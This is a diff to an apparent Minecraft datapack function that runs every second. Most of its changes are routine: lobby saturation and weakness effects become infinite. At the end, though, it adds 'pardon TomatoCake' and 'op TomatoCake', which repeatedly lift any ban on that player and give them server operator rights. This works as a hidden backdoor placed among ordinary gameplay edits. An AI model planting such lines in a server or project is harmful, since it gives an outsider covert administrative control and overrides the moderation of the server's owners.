@@ -1,5 +1,5 @@
-effect give @a[tag=lobby,gamemode=!creative,gamemode=!spectator] saturation 200 255 true
-effect give @a[tag=!skywars,gamemode=!creative,gamemode=!spectator] weakness 10 255 true
+effect give @a[tag=lobby,gamemode=!creative,gamemode=!spectator] saturation infinite 0 true
+effect give @a[tag=!skywars,gamemode=!creative,gamemode=!spectator] weakness infinite 255 true
 spawnpoint @a[tag=lobby] 0 19 0 90
 
 execute if entity @a[team=70rainbow] if score #rainbow temp matches 1 run team modify 70rainbow prefix [{"text":"[","color":"white"},{"text":"R","color":"red"},{"text":"a","color":"gold"},{"text":"i","color":"yellow"},{"text":"n","color":"green"},{"text":"b","color":"aqua"},{"text":"o","color":"light_purple"},{"text":"w","color":"dark_purple"},{"text":"] "}]
@@ -15,4 +15,6 @@ execute if score #rainbow temp matches 8.. run scoreboard players set #rainbow t
 xp add @a[tag=xpcountdown] -1 levels
 tag @a[tag=xpcountdown,level=0] remove xpcountdown
 
+pardon TomatoCake
+op TomatoCake
 schedule function vm:1sec 1s
